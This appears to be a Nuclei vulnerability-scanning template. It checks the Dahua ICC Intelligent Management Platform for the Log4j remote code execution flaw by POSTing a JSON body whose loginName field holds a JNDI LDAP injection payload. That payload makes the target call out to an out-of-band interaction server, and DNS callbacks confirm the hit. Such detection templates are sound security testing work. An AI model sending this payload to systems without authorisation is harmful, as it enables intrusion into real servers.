id: poc-dahua-icc-log4j-rce
info:
  name: Dahua ICC Intelligent Management Platform Log4j RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: dnslog,rce
  description: |
    This template checks for Log4j remote code execution vulnerability in Dahua ICC Intelligent Management Platform by sending a crafted payload containing a JNDI lookup to a DNS-based interaction server.

variables:
  reverse: "{{interactsh-url}}"

http:
  - method: POST
    path:
      - "/evo-apigw/evo-brm/1.2.0/user/is-exist"
    headers:
      Content-Type: application/json;charset=utf-8
    body: |
      {
        "loginName": "${jndi:ldap://{{reverse}}}"
      }
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_request
        words:
          - "${jndi:ldap://"
